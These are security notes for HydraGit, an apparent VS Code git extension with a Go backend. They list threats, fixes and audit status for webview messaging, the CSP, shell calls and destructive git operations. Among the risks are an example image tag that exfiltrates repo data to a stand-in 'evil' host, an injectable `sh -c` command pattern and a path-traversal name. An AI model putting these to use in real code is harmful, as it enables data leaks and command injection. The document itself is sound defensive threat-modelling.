# HydraGit — Security Notes

Not a web app. No network server, no auth tokens, no cloud.
Attack surface is intentionally small — local extension, local git, local filesystem.
These are the things actually worth thinking about.

> **Audited 2026-05-30 against the code.** Status legend in each section:
> ✅ done · ⚠️ still open · 🔎 verified. Most hardening TODOs below are still open —
> they describe intended defenses, not the current state.
>
> **Re-verified 2026-06-06:** the stray tracked `hydragit-server` binary is now
> gone (✅). Still open: the message-bus command allowlist / shape validation, the
> `HYDRAGIT_REPO` repo check in `main.go`, and empty-param rejection in `handler.go`.
> The 0.3.0 wave added history-rewriting and force-push commands — see
> **Destructive Operations** below.
>
> **Hardening pass 2026-06-10** (see `FABLE.md` for the full review): ✅ per-request
> `msg.repo` allowlist in both webview message handlers (the webview can no longer
> point git at arbitrary directories); ✅ `worktree.open` path validated against
> `worktree.list`; ✅ sidebar CSP added; ✅ `img-src https:` dropped + `connect-src
> 'none'` on all three panels (zero webview network egress); ✅ destructive-op
> confirmation gate in the host; ✅ `HYDRAGIT_REPO` startup check; ✅ empty-param
> rejection for mutating commands; ✅ stash index validation; ✅ log dir/file perms
> 0o700/0o600; ✅ 64KB stdin scanner limit raised (16MB). Still open: full message
> shape validation and the explicit command allowlist (Go's `default:` case plus
> the repo gate are the current backstops).

---

## Message Bus (Webview ↔ Extension Host)

| Thing | Risk | Fix | Status |
|---|---|---|---|
| Per-request `repo` root unvalidated | Webview could point git at ANY directory on disk — read a foreign repo via `log`/`diff`, or destroy one via `reset`/`stash.clear` | Allowlist `msg.repo` against the roots RepoService has discovered, in both webview message handlers | ✅ Done 2026-06-10 — `repoAllowed()` gate at the top of both `onDidReceiveMessage` handlers; `extension.ts` refreshes the set before webviews learn the repo list. |
| `worktree.open` arbitrary path | Webview opens an attacker-chosen folder in a new window (workspace-trust escalation) | Only open paths `git worktree list` actually reports | ✅ Done 2026-06-10 — host checks the path against `worktree.list` before `vscode.openFolder`. |
| Unvalidated message shape | Malformed/missing fields crash the handler or pass garbage to Go | Validate `msg.cmd` is a string and `msg.id` is a string before processing | ⚠️ Open — `panel.ts` forwards `msg.cmd`/`msg.params` to `goProcess.send` with no shape check. (Go side: `handle()` has a `default:` returning "unknown command", so an unknown cmd fails cleanly; empty required params are now rejected.) |
| Unknown command names | Webview (or a bug) sends a cmd that shouldn't be callable | Allowlist all valid commands in extension host — reject anything not on the list | ⚠️ Open — no `ALLOWED_COMMANDS` set in `panel.ts`. Go's `default:` case + the repo gate are the backstops. |
| `force: true` on destructive ops | Webview could send `force: true` on `branch.delete` without user ever confirming | Don't trust `force` from the webview message. Track confirmation state in extension host, gate forwarding on it. | ✅ Mitigated 2026-06-10 — host-side gate: `force: true` params, `push.force` and `stash.clear` only forward if a native `ui.confirm` was answered Yes within the last 30s (`destructiveOpBlocked` in `panel.ts`). Known limitation: the confirmation isn't bound to the *specific* op — it proves a real user clicked a real native dialog moments before, not which one. |

No encryption needed. `postMessage` is VS Code internal IPC — same machine, same process group. Encrypting it is security theater. The real boundary is the CSP.

---

## Webview CSP

The same locked-down CSP is now built in all three panels (`panel.ts` main +
sidebar, `historyPanel.ts`). No nonce — scripts are scoped to the webview's own
resource origin, and the webview has **zero network egress**:

```
default-src 'none';
script-src  <webview.cspSource>;
style-src   <webview.cspSource> 'unsafe-inline';
img-src     data: blob: <webview.cspSource>;
font-src    data:;
connect-src 'none';
```

| Thing | Risk | Fix | Status |
|---|---|---|---|
| Weakened `script-src` | If `cspSource` were swapped for `'unsafe-inline'`, any injected script runs with full webview privileges | Keep `script-src <cspSource>` — scripts only load from the extension's own webview origin | 🔎 Correct as-is. Never add `'unsafe-inline'` to `script-src`. |
| `style-src 'unsafe-inline'` | Inline styles allowed (Svelte injects them) | Accepted — style injection is not a script-execution vector here | ⚠️ Accepted risk, documented |
| `img-src https:` exfiltration channel | An injected `<img src="https://evil/?d=...">` leaks repo metadata via query string despite `default-src 'none'` | No remote images are loaded anywhere (verified — the only `<img>` is the bundled icon), so drop `https:` entirely | ✅ Done 2026-06-10 — all three panels. If avatars ever land, allowlist the specific host, don't restore blanket `https:`. |
| `connect-src` not explicit | Webview JS could fetch() to the internet, exfiltrating repo paths/branch names | `default-src 'none'` already blocks this — explicit is clearer | ✅ Done 2026-06-10 — `connect-src 'none'` on all three panels. |
| Sidebar panel has no CSP meta tag | Sidebar `getHtml()` injects no CSP at all (main panel does) | Add the same CSP `<meta>` to the sidebar HTML | ✅ Done 2026-06-10 — sidebar now injects the same CSP as the main panel. |

---

## Go Binary — Params & Shell Safety

| Thing | Risk | Fix | Status |
|---|---|---|---|
| String concat into shell command | If anyone ever does `exec.Command("sh", "-c", "git " + userInput)`, that's full shell injection | Always use `exec.Command("git", args...)` with `...string` slice — never a shell string | 🔎 Verified clean — all git calls go through `repo.go` `runStdin()` using `exec.Command("git", args...)`. No `sh -c`/`bash -c` in production code (only one test fixture uses `bash`). |
| Empty or missing params | `branch.delete` with empty name, or `checkout` with empty branch, passes garbage to git | Validate params in Go handler before calling git functions — reject empty strings | ✅ Done 2026-06-10 — `missingParam()` helper guards every mutating command's required string params; stash pop/apply/drop reject negative indexes. |
| Path traversal in branch/file names | A crafted name like `../../something` passed as a git arg | `exec.Command` with args slice already prevents shell injection. Git itself rejects bad ref names. Belt-and-suspenders: reject names containing `..` or `/` where not expected | ⚠️ Open — no `validRefName` helper in `handler.go`. Relies on git's own ref validation. |
| `HYDRAGIT_REPO` not validated | Binary starts with an empty or non-repo path, all commands silently fail or error noisily | On startup, check `HYDRAGIT_REPO` is a repo (`git.IsRepo`) | ✅ Done 2026-06-10 — checked at startup, logged loudly on both channels. Deliberately **not fatal**: in a multi-repo workspace every request can carry a valid repo override, so a bad default only degrades the fallback path — exiting would take working repos down with it. |

---

## Destructive Operations

| Thing | Risk | Fix | TODO |
|---|---|---|---|
| `branch.delete` with force | Deletes unmerged branch, work is gone | Use `-d` (safe) by default. Only pass `-D` if `force` is explicitly set AND confirmed outside the webview | ✅ Mitigated 2026-06-10 — host-side confirmation gate (see message bus table). |
| `stash.drop` | No undo — stash is permanently gone | Already requires explicit user action in UI. Go side: validate index before running | ✅ Done 2026-06-10 — negative indexes rejected in `handler.go`; out-of-range still left to git (safe). |
| `rebase` | Rewrites history. On shared branches, force-push required, breaks teammates | No code fix — this is a git concept. Surface a warning in UI before rebasing non-local branches | Add `isRemote` check in webview before sending `rebase` cmd; show confirmation if true |
| `push` with arbitrary branch param | Could push to wrong branch if param is wrong | Validate branch param matches a known local branch (already in your branch list) | Cross-check `push` param against last-known branch list in extension host before forwarding to Go |
| `push.force` (force-with-lease) | Rewrites the remote branch; can clobber teammates' work | Already uses `--force-with-lease` (refuses to overwrite unseen remote commits) and is only offered after a rejected push. | 🔎 Mitigated — lease guards against unseen commits. Still warn loudly for shared branches. |
| History rewriting (`rebase.interactive`, `rebase.drop`, `rebase.reword`, `commit.squash`, `commit.amend`, `push.upto`) | Rewrites local commits; needs force-push to publish; breaks teammates on shared branches | UI confirms each rewrite and pauses (never auto-aborts) on conflict; `ORIG_HEAD`/reflog allow recovery via the undo timeline. | ⚠️ Open — no extension-host check that the target isn't a published/shared branch before rewriting. |
| Reflog reset (`reset --hard` via undo timeline) + `undo.last` | Discards uncommitted work / moves HEAD | Hard reset auto-stashes a dirty tree first (`ResetWithAutostash`); each reset takes one confirmation. | ✅ Auto-stash net in place — destructive reset is recoverable from the stash. |

---

## Log Files

| Thing | Risk | Fix | TODO |
|---|---|---|---|
| Log files contain repo metadata | Branch names, file paths, git command details are all in `hydragit-YYYY-MM-DD.log` | Logs live in `ctx.logUri` — user-owned directory; tighten perms anyway | ✅ Done 2026-06-10 — log dir `0o700`, log files `0o600`. |
| Log retention | Old logs accumulate and contain repo history | Already handled: 7-day rotation, cleaned on Init | ✅ Done — 7-day rotation, cleaned on `Init`. |

---

## Binary & Distribution

| Thing | Risk | Fix | TODO |
|---|---|---|---|
| Binary in `bin/` is not signed | macOS Gatekeeper may block it; users get security prompts | Sign and notarize the binary for macOS distribution | Set up `codesign` + `xcrun notarytool` in Makefile `build-darwin` target before publishing |
| Binary committed to git | Large binaries bloat repo history | Binaries should be gitignored, bundled only in `.vsix` | ✅ Done — `bin/hydragit-server*` is gitignored and no `hydragit-server` binary is tracked (`git ls-files` clean as of 2026-06-06). |
| `.vsix` contains all 4 platform binaries | Users download binaries for platforms they don't use (~adds ~10MB) | Acceptable for v0.1. Future: platform-specific `.vsix` via `vsce package --target` | Post-v0.1: add `--target` builds to Makefile for each platform |

---

## What is explicitly out of scope

- **Encryption of IPC** — not a network channel, wrong threat model
- **Input sanitisation against git logic bugs** — git's own validation is the authority on valid ref names
- **Sandboxing the Go binary** — it needs filesystem access to the repo by design
- **Protecting against a malicious VS Code extension** — if another extension is malicious, it already has Node.js access; not your problem to solve
